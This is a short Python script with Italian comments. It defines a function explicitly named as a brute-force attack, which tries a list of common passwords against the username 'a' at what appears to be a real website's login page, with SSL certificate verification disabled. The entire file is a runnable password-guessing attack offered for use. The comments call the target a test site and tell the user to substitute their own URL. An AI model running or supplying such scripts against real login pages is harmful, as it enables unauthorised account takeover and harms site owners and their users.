import requests

def bruteForceAttack(url, username, password_list):
    for password in password_list:
        try:
            # Disabilita la verifica SSL (solo per scopi di test)
            response = requests.post(url, data={'username': username, 'password': password}, verify=False)
            
            # Verifica se la risposta è quella giusta
            if response.status_code == 200 and "success" in response.text.lower():  # Modifica la logica in base alla tua risposta
                print(f"Login riuscito con la password: {password}")
                return password
            else:
                print(f"Accesso fallito con la password: {password}")
        
        except requests.exceptions.SSLError as e:
            print(f"Errore SSL: {e}")
            return None
    
    return None

# URL del sito di test
url = "https://vocari.me/login"  # Sostituisci con il tuo URL
username = "a"
password_list = ["12345", "admin", "password","a", "testpassword"]

password_trovata = bruteForceAttack(url, username, password_list)

if password_trovata:
    print(f"La password corretta è: {password_trovata}")
else:
    print("Nessuna password corretta trovata.")
